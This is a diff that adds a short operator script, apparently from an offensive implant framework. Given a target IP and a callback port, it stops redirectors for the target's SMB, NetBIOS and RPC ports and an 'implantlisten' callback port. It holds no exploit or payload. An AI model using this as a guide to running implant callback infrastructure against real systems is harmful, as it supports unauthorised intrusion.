@@ -1,0 +1,72 @@
+#--------------------------------------------------------
+# File: StopFCO.eps
+#
+#  Start State:	FCO redirectors are running.
+#  End State:	FCO redirectors have been stopped.
+#  Errors:	
+#  Comments:	
+#
+# Arguments:
+#    $argv[1] = The target IP address
+#    $argv[2] = The FCO callback port
+#
+# Modifications:
+#  05/25/01	Created.
+#--------------------------------------------------------
+
+if ($argc != 3) {
+    echo "Usage: $argv[0] <targetIP> <callbackPort>\r\n";
+    return false;
+}
+
+@echo off;
+
+echo "Stop FCO redirectors:";
+echo "        Target IP : $argv[1]";
+echo "    Callback Port : $argv[2]";
+ifnot (prompt "Do you want to continue?") {
+    echo "Aborting script...";
+    return false;
+}
+
+bool $allStopped = true;
+
+echo "Redirect TCP 139";
+if (`stop redirect -contains "target $argv[1] 139"`) {
+    echo "    STOPPED";
+} else {
+    echo "    FAILED";
+    $allStopped = false;
+}
+
+echo "Redirect UDP 137";
+if (`stop redirect -contains "target $argv[1] 137"`) {
+    echo "    STOPPED";
+} else {
+    echo "    FAILED";
+    $allStopped = false;
+}
+
+echo "Redirect TCP 135";
+if (`stop redirect -contains "target $argv[1] 135"`) {
+    echo "    STOPPED";
+} else {
+    echo "    FAILED";
+    $allStopped = false;
+}
+
+echo "Redirect TCP Callback Port $argv[2]";
+if (`stop redirect -contains "implantlisten $argv[2]"`) {
+    echo "    STOPPED";
+} else {
+    echo "    FAILED";
+    $allStopped = false;
+}
+
+if ($allStopped) {
+    echo "All FCO redirectors for this target have been stopped";
+} else {
+    echo "Unable to stop all FCO redirectors for this target";
+}
+
+return $allStopped;
